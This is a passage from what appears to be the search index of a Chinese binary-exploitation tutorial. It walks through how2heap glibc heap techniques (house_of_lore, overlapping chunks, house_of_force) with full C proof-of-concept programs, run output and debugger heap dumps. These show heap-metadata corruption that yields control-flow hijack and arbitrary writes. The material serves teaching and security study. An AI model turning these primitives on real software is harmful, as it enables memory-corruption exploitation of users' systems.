fast chunk \u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u5176\u91ca\u653e\u540e\u867d\u7136\u662f\u88ab\u52a0\u5165\u5230 fast bins \u4e2d\uff0c\u800c\u4e0d\u662f unsorted bin\uff0c\u4f46 malloc \u4e4b\u540e\uff0c\u4e5f\u4f1a\u88ab\u6574\u7406\u5230 small bins \u91cc\u3002\u81ea\u884c\u5c1d\u8bd5\u5427\u3002 heap-use-after-free\uff0c\u6240\u4ee5\u4e0a\u9762\u6211\u4eec\u7528\u4e8e\u4fee\u6539 bk \u6307\u9488\u7684\u6f0f\u6d1e\uff0c\u5e94\u8be5\u5c31\u662f\u4e00\u4e2a UAF \u5427\uff0c\u5f53\u7136\u6ea2\u51fa\u4e5f\u662f\u53ef\u4ee5\u7684\uff1a $ gcc -fsanitize=address -g house_of_lore.c $ ./a.out Allocated the victim (small) chunk: 0x60c00000bf80 stack_buffer_1: 0x7ffd1fbc5cd0 stack_buffer_2: 0x7ffd1fbc5c90 Freeing the victim chunk 0x60c00000bf80, it will be inserted in the unsorted bin ================================================================= ==6034==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c00000bf80 at pc 0x000000400eec bp 0x7ffd1fbc5bf0 sp 0x7ffd1fbc5be0 READ of size 8 at 0x60c00000bf80 thread T0 #0 0x400eeb in main /home/firmy/how2heap/house_of_lore.c:27 #1 0x7febee33c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #2 0x400b38 in _start (/home/firmy/how2heap/a.out+0x400b38) \u6700\u540e\u518d\u7ed9\u4e00\u4e2a libc-2.27 \u7248\u672c\u7684\uff1a #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot(){ puts(\"Nice jump d00d\"); exit(0); } int main() { intptr_t *victim = malloc(0x80); // fill the tcache int *a[10]; int i; for (i = 0; i < 7; i++) { a[i] = malloc(0x80); } for (i = 0; i < 7; i++) { free(a[i]); } memset(victim, 'A', 0x80); void *p5 = malloc(0x10); memset(p5, 'A', 0x10); intptr_t *victim_chunk = victim - 2; fprintf(stderr, \"Allocated the victim (small) chunk: %p\\n\", victim); intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[6] = {0}; stack_buffer_1[0] = 0; stack_buffer_1[2] = victim_chunk; stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; stack_buffer_2[3] = (intptr_t*)stack_buffer_1; // 3675 bck->fd = bin; fprintf(stderr, \"stack_buffer_1: %p\\n\", (void*)stack_buffer_1); fprintf(stderr, \"stack_buffer_2: %p\\n\\n\", (void*)stack_buffer_2); free((void*)victim); fprintf(stderr, \"Freeing the victim chunk %p, it will be inserted in the unsorted bin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); void *p2 = malloc(0x100); fprintf(stderr, \"Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\\n\", p2); fprintf(stderr, \"The victim chunk %p will be inserted in front of the SmallBin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); victim[1] = (intptr_t)stack_buffer_1; fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"); void *p3 = malloc(0x40); // empty the tcache for (i = 0; i < 7; i++) { a[i] = malloc(0x80); } char *p4 = malloc(0x80); memset(p4, 'A', 0x10); fprintf(stderr, \"This last malloc should return a chunk at the position injected in bin->bk: %p\\n\", p4); fprintf(stderr, \"The fd pointer of stack_buffer_2 has changed: %p\\n\\n\", stack_buffer_2[2]); intptr_t sc = (intptr_t)jackpot; memcpy((p4+0xa8), &sc, 8); } $ gcc -g house_of_lore.c $ ./a.out Allocated the victim (small) chunk: 0x55674d75f260 stack_buffer_1: 0x7ffff71fb1d0 stack_buffer_2: 0x7ffff71fb1f0 Freeing the victim chunk 0x55674d75f260, it will be inserted in the unsorted bin victim->fd: 0x7f1eba392b00 victim->bk: 0x7f1eba392b00 Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x55674d75f700 The victim chunk 0x55674d75f260 will be inserted in front of the SmallBin victim->fd: 0x7f1eba392b80 victim->bk: 0x7f1eba392b80 Now emulating a vulnerability that can overwrite the victim->bk pointer This last malloc should return a chunk at the position injected in bin->bk: 0x7ffff71fb1e0 The fd pointer of stack_buffer_2 has changed: 0x7ffff71fb1e0 Nice jump d00d","title":"house_of_lore"},{"location":"Tutorial/Material/Binary%20Exploitation/#overlapping_chunks","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> int main() { intptr_t *p1,*p2,*p3,*p4; p1 = malloc(0x90 - 8); p2 = malloc(0x90 - 8); p3 = malloc(0x80 - 8); memset(p1, 'A', 0x90 - 8); memset(p2, 'A', 0x90 - 8); memset(p3, 'A', 0x80 - 8); fprintf(stderr, \"Now we allocate 3 chunks on the heap\\n\"); fprintf(stderr, \"p1=%p\\np2=%p\\np3=%p\\n\\n\", p1, p2, p3); free(p2); fprintf(stderr, \"Freeing the chunk p2\\n\"); int evil_chunk_size = 0x111; int evil_region_size = 0x110 - 8; *(p2-1) = evil_chunk_size; // Overwriting the \"size\" field of chunk p2 fprintf(stderr, \"Emulating an overflow that can overwrite the size of the chunk p2.\\n\\n\"); p4 = malloc(evil_region_size); fprintf(stderr, \"p4: %p ~ %p\\n\", p4, p4+evil_region_size); fprintf(stderr, \"p3: %p ~ %p\\n\", p3, p3+0x80); fprintf(stderr, \"\\nIf we memset(p4, 'B', 0xd0), we have:\\n\"); memset(p4, 'B', 0xd0); fprintf(stderr, \"p4 = %s\\n\", (char *)p4); fprintf(stderr, \"p3 = %s\\n\", (char *)p3); fprintf(stderr, \"\\nIf we memset(p3, 'C', 0x50), we have:\\n\"); memset(p3, 'C', 0x50); fprintf(stderr, \"p4 = %s\\n\", (char *)p4); fprintf(stderr, \"p3 = %s\\n\", (char *)p3); } $ gcc -g overlapping_chunks.c $ ./a.out Now we allocate 3 chunks on the heap p1=0x1e2b010 p2=0x1e2b0a0 p3=0x1e2b130 Freeing the chunk p2 Emulating an overflow that can overwrite the size of the chunk p2. p4: 0x1e2b0a0 ~ 0x1e2b8e0 p3: 0x1e2b130 ~ 0x1e2b530 If we memset(p4, 'B', 0xd0), we have: p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa If we memset(p3, 'C', 0x50), we have: p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa \u8fd9\u4e2a\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u5806\u5757\u91cd\u53e0\u7684\u95ee\u9898\u3002\u901a\u8fc7\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6539\u5199 unsorted bin \u4e2d\u7a7a\u95f2\u5806\u5757\u7684 size\uff0c\u6539\u53d8\u4e0b\u4e00\u6b21 malloc \u53ef\u4ee5\u8fd4\u56de\u7684\u5806\u5757\u5927\u5c0f\u3002 \u9996\u5148\u5206\u914d\u4e09\u4e2a\u5806\u5757\uff0c\u7136\u540e\u91ca\u653e\u6389\u4e2d\u95f4\u7684\u4e00\u4e2a\uff1a gef\u27a4 x/60gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x0000000000000091 <-- chunk 2 [be freed] 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x4141414141414141 0x4141414141414141 0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x0000000000000090 0x0000000000000080 <-- chunk 3 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x4141414141414141 0x602150: 0x4141414141414141 0x4141414141414141 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x0000000000020e61 <-- top chunk 0x6021b0: 0x0000000000000000 0x0000000000000000 0x6021c0: 0x0000000000000000 0x0000000000000000 0x6021d0: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x90, flags=PREV_INUSE) chunk 2 \u88ab\u653e\u5230\u4e86 unsorted bin \u4e2d\uff0c\u5176 size \u503c\u4e3a 0x90\u3002 \u63a5\u4e0b\u6765\uff0c\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 chunk 2 \u7684 size \u503c\uff0c\u6bd4\u5982\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u6539\u4e3a 0x111\uff0c\u4e5f\u5c31\u662f\u539f\u672c chunk 2 \u548c chunk 3 \u7684\u5927\u5c0f\u76f8\u52a0\uff0c\u6700\u540e\u4e00\u4f4d\u662f 1 \u8868\u793a chunk 1 \u662f\u5728\u4f7f\u7528\u7684\uff0c\u5176\u5b9e\u6709\u6ca1\u6709\u90fd\u65e0\u6240\u8c13\u3002 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x110, flags=PREV_INUSE) \u8fd9\u65f6 unsorted bin \u4e2d\u7684\u6570\u636e\u4e5f\u66f4\u6539\u4e86\u3002 \u63a5\u4e0b\u6765 malloc \u4e00\u4e2a\u5927\u5c0f\u7684\u7b49\u4e8e chunk 2 \u548c chunk 3 \u4e4b\u548c\u7684 chunk 4\uff0c\u8fd9\u4f1a\u5c06 chunk 2 \u548c chunk 3 \u90fd\u5305\u542b\u8fdb\u6765\uff1a gef\u27a4 x/60gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x0000000000000111 <-- chunk 4 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x4141414141414141 0x4141414141414141 0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x0000000000000090 0x0000000000000080 <-- chunk 3 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x4141414141414141 0x602150: 0x4141414141414141 0x4141414141414141 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x0000000000020e61 <-- top chunk 0x6021b0: 0x0000000000000000 0x0000000000000000 0x6021c0: 0x0000000000000000 0x0000000000000000 0x6021d0: 0x0000000000000000 0x0000000000000000 \u8fd9\u6837\uff0c\u76f8\u5f53\u4e8e chunk 4 \u548c chunk 3 \u5c31\u91cd\u53e0\u4e86\uff0c\u4e24\u4e2a chunk \u53ef\u4ee5\u4e92\u76f8\u4fee\u6539\u5bf9\u65b9\u7684\u6570\u636e\u3002\u5c31\u50cf\u4e0a\u9762\u7684\u8fd0\u884c\u7ed3\u679c\u6253\u5370\u51fa\u6765\u7684\u90a3\u6837\u3002","title":"overlapping_chunks"},{"location":"Tutorial/Material/Binary%20Exploitation/#overlapping_chunks_2","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> int main() { intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6; int prev_in_use = 0x1; p1 = malloc(0x10); p2 = malloc(0x80); p3 = malloc(0x80); p4 = malloc(0x80); p5 = malloc(0x10); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); memset(p1, 'A', real_size_p1); memset(p2, 'A', real_size_p2); memset(p3, 'A', real_size_p3); memset(p4, 'A', real_size_p4); memset(p5, 'A', real_size_p5); fprintf(stderr, \"Now we allocate 5 chunks on the heap\\n\\n\"); fprintf(stderr, \"chunk p1: %p ~ %p\\n\", p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr, \"chunk p2: %p ~ %p\\n\", p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr, \"chunk p3: %p ~ %p\\n\", p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr, \"chunk p4: %p ~ %p\\n\", p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr, \"chunk p5: %p ~ %p\\n\", p5, (unsigned char *)p5+malloc_usable_size(p5)); free(p4); fprintf(stderr, \"\\nLet's free the chunk p4\\n\\n\"); fprintf(stderr, \"Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\\n\\n\"); *(unsigned int *)((unsigned char *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // BUG HERE free(p2); p6 = malloc(0x1b0 - 0x10); real_size_p6 = malloc_usable_size(p6); fprintf(stderr, \"Allocating a new chunk 6: %p ~ %p\\n\\n\", p6, (unsigned char *)p6+real_size_p6); fprintf(stderr, \"Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\\n\"); fprintf(stderr, \"p3 before = %s\\n\", (char *)p3); memset(p6, 'B', 0xd0); fprintf(stderr, \"p3 after = %s\\n\", (char *)p3); } $ gcc -g overlapping_chunks_2.c $ ./a.out Now we allocate 5 chunks on the heap chunk p1: 0x18c2010 ~ 0x18c2028 chunk p2: 0x18c2030 ~ 0x18c20b8 chunk p3: 0x18c20c0 ~ 0x18c2148 chunk p4: 0x18c2150 ~ 0x18c21d8 chunk p5: 0x18c21e0 ~ 0x18c21f8 Let's free the chunk p4 Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3) Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8 Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0) p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd p3 after = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd \u540c\u6837\u662f\u5806\u5757\u91cd\u53e0\u7684\u95ee\u9898\uff0c\u524d\u9762\u90a3\u4e2a\u662f\u5728 chunk \u5df2\u7ecf\u88ab free\uff0c\u52a0\u5165\u5230\u4e86 unsorted bin \u4e4b\u540e\uff0c\u518d\u4fee\u6539\u5176 size \u503c\uff0c\u7136\u540e malloc \u4e00\u4e2a\u4e0d\u4e00\u6837\u7684 chunk \u51fa\u6765\uff0c\u800c\u8fd9\u91cc\u662f\u5728 free \u4e4b\u524d\u4fee\u6539 size \u503c\uff0c\u4f7f free \u9519\u8bef\u5730\u4fee\u6539\u4e86\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u503c\uff0c\u5bfc\u81f4\u4e2d\u95f4\u7684 chunk \u5f3a\u884c\u5408\u5e76\u3002\u53e6\u5916\u524d\u9762\u90a3\u4e2a\u91cd\u53e0\u662f\u76f8\u90bb\u5806\u5757\u4e4b\u95f4\u7684\uff0c\u800c\u8fd9\u91cc\u662f\u4e0d\u76f8\u90bb\u5806\u5757\u4e4b\u95f4\u7684\u3002 \u6211\u4eec\u9700\u8981\u4e94\u4e2a\u5806\u5757\uff0c\u5047\u8bbe\u7b2c chunk 1 \u5b58\u5728\u6ea2\u51fa\uff0c\u53ef\u4ee5\u6539\u5199\u7b2c\u4e8c\u4e2a chunk 2 \u7684\u6570\u636e\uff0cchunk 5 \u7684\u4f5c\u7528\u662f\u9632\u6b62\u91ca\u653e chunk 4 \u540e\u88ab\u5408\u5e76\u8fdb top chunk\u3002\u6240\u4ee5\u6211\u4eec\u8981\u91cd\u53e0\u7684\u533a\u57df\u662f chunk 2 \u5230 chunk 4\u3002\u9996\u5148\u5c06 chunk 4 \u91ca\u653e\u6389\uff0c\u6ce8\u610f\u770b chunk 5 \u7684 prev_size \u503c\uff1a gef\u27a4 x/70gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000091 <-- chunk 2 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x4141414141414141 0x6020a0: 0x4141414141414141 0x4141414141414141 0x6020b0: 0x4141414141414141 0x0000000000000091 <-- chunk 3 0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x4141414141414141 0x4141414141414141 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x0000000000000091 <-- chunk 4 [be freed] 0x602150: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x4141414141414141 0x6021b0: 0x4141414141414141 0x4141414141414141 0x6021c0: 0x4141414141414141 0x4141414141414141 0x6021d0: 0x0000000000000090 0x0000000000000020 <-- chunk 5 <-- prev_size 0x6021e0: 0x4141414141414141 0x4141414141414141 0x6021f0: 0x4141414141414141 0x0000000000020e11 <-- top chunk 0x602200: 0x0000000000000000 0x0000000000000000 0x602210: 0x0000000000000000 0x0000000000000000 0x602220: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602140, bk=0x602140 \u2192 Chunk(addr=0x602150, size=0x90, flags=PREV_INUSE) free chunk 4 \u88ab\u653e\u5165 unsorted bin\uff0c\u5927\u5c0f\u4e3a 0x90\u3002 \u63a5\u4e0b\u6765\u662f\u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u5229\u7528 chunk 1 \u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5c06 chunk 2 \u7684 size \u503c\u4fee\u6539\u4e3a chunk 2 \u548c chunk 3 \u7684\u5927\u5c0f\u4e4b\u548c\uff0c\u5373 0x90+0x90+0x1=0x121\uff0c\u6700\u540e\u7684 1 \u662f\u6807\u5fd7\u4f4d\u3002\u8fd9\u6837\u5f53\u6211\u4eec\u91ca\u653e chunk 2 \u7684\u65f6\u5019\uff0cmalloc \u6839\u636e\u8fd9\u4e2a\u88ab\u4fee\u6539\u7684 size \u503c\uff0c\u4f1a\u4ee5\u4e3a chunk 2 \u52a0\u4e0a chunk 3 \u7684\u533a\u57df\u90fd\u662f\u8981\u91ca\u653e\u7684\uff0c\u7136\u540e\u5c31\u9519\u8bef\u5730\u4fee\u6539\u4e86 chunk 5 \u7684 prev_size\u3002\u63a5\u7740\uff0c\u5b83\u53d1\u73b0\u7d27\u90bb\u7684\u4e00\u5757 chunk 4 \u4e5f\u662f free \u72b6\u6001\uff0c\u5c31\u628a\u5b83\u4fe9\u5408\u5e76\u5728\u4e86\u4e00\u8d77\uff0c\u7ec4\u6210\u4e00\u4e2a\u5927 free chunk\uff0c\u653e\u8fdb unsorted bin \u4e2d\u3002 gef\u27a4 x/70gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x00000000000001b1 <-- chunk 2 [be freed] <-- unsorted bin 0x602030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x4141414141414141 0x6020a0: 0x4141414141414141 0x4141414141414141 0x6020b0: 0x4141414141414141 0x0000000000000091 <-- chunk 3 0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x4141414141414141 0x4141414141414141 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x0000000000000091 <-- chunk 4 [be freed] 0x602150: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x4141414141414141 0x6021b0: 0x4141414141414141 0x4141414141414141 0x6021c0: 0x4141414141414141 0x4141414141414141 0x6021d0: 0x00000000000001b0 0x0000000000000020 <-- chunk 5 <-- prev_size 0x6021e0: 0x4141414141414141 0x4141414141414141 0x6021f0: 0x4141414141414141 0x0000000000020e11 <-- top chunk 0x602200: 0x0000000000000000 0x0000000000000000 0x602210: 0x0000000000000000 0x0000000000000000 0x602220: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 \u2192 Chunk(addr=0x602030, size=0x1b0, flags=PREV_INUSE) \u73b0\u5728 unsorted bin \u91cc\u7684 chunk \u7684\u5927\u5c0f\u4e3a 0x1b0\uff0c\u5373 0x90*3\u3002\u54a6\uff0c\u6240\u4ee5 chunk 3 \u867d\u7136\u662f\u4f7f\u7528\u72b6\u6001\uff0c\u4f46\u4e5f\u88ab\u5f3a\u884c\u7b97\u5728\u4e86 free chunk \u7684\u7a7a\u95f4\u91cc\u4e86\u3002 \u6700\u540e\uff0c\u5982\u679c\u6211\u4eec\u5206\u914d\u4e00\u5757\u5927\u5c0f\u4e3a 0x1b0-0x10 \u7684\u5927\u7a7a\u95f4\uff0c\u8fd4\u56de\u7684\u5806\u5757\u5373\u662f\u5305\u62ec\u4e86 chunk 2 + chunk 3 + chunk 4 \u7684\u5927 chunk\u3002\u8fd9\u65f6 chunk 6 \u548c chunk 3 \u5c31\u91cd\u53e0\u4e86\uff0c\u7ed3\u679c\u5c31\u50cf\u4e0a\u9762\u8fd0\u884c\u65f6\u6253\u5370\u51fa\u6765\u7684\u4e00\u6837\u3002","title":"overlapping_chunks_2"},{"location":"Tutorial/Material/Binary%20Exploitation/#318-linux","text":"how2heap house_of_force unsorted_bin_into_stack unsorted_bin_attack house_of_einherjar house_of_orange \u53c2\u8003\u8d44\u6599 \u4e0b\u8f7d\u6587\u4ef6","title":"3.1.8 Linux \u5806\u5229\u7528\uff08\u4e0b\uff09"},{"location":"Tutorial/Material/Binary%20Exploitation/#how2heap_2","text":"","title":"how2heap"},{"location":"Tutorial/Material/Binary%20Exploitation/#house_of_force","text":"#include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> char bss_var[] = \"This is a string that we want to overwrite.\"; int main() { fprintf(stderr, \"We will overwrite a variable at %p\\n\\n\", bss_var); intptr_t *p1 = malloc(0x10); int real_size = malloc_usable_size(p1); memset(p1, 'A', real_size); fprintf(stderr, \"Let's allocate the first chunk of 0x10 bytes: %p.\\n\", p1); fprintf(stderr, \"Real size of our allocated chunk is 0x%x.\\n\\n\", real_size); intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size); fprintf(stderr, \"Overwriting the top chunk size with a big value so the malloc will never call mmap.\\n\"); fprintf(stderr, \"Old size of top chunk: %#llx\\n\", *((unsigned long long int *)ptr_top)); ptr_top[0] = -1; fprintf(stderr, \"New size of top chunk: %#llx\\n\", *((unsigned long long int *)ptr_top)); unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top; fprintf(stderr, \"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size, we will malloc %#lx bytes.\\n\", bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); int real_size_new = malloc_usable_size(new_ptr); memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20); fprintf(stderr, \"As expected, the new pointer is at the same place as the old top chunk: %p\\n\", new_ptr); void* ctr_chunk = malloc(0x30); fprintf(stderr, \"malloc(0x30) => %p!\\n\", ctr_chunk); fprintf(stderr, \"\\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\\n\"); fprintf(stderr, \"old string: %s\\n\", bss_var); strcpy(ctr_chunk, \"YEAH!!!\"); fprintf(stderr, \"new string: %s\\n\", bss_var); } $ gcc -g house_of_force.c $ ./a.out We will overwrite a variable at 0x601080 Let's allocate the first chunk of 0x10 bytes: 0x824010. Real size of our allocated chunk is 0x18. Overwriting the top chunk size with a big value so the malloc will never call mmap. Old size of top chunk: 0x20fe1 New size of top chunk: 0xffffffffffffffff The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes. As expected, the new pointer is at the same place as the old top chunk: 0x824030 malloc(0x30) => 0x601080! Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value. old string: This is a string that we want to overwrite. new string: YEAH!!! house_of_force \u662f\u4e00\u79cd\u901a\u8fc7\u6539\u5199 top chunk \u7684 size \u5b57\u6bb5\u6765\u6b3a\u9a97 malloc \u8fd4\u56de\u4efb\u610f\u5730\u5740\u7684\u6280\u672f\u3002\u6211\u4eec\u77e5\u9053\u5728\u7a7a\u95f2\u5185\u5b58\u7684\u6700\u9ad8\u5904\uff0c\u5fc5\u7136\u5b58\u5728\u4e00\u5757\u7a7a\u95f2\u7684 chunk\uff0c\u5373 top chunk\uff0c\u5f53 bins \u548c fast bins 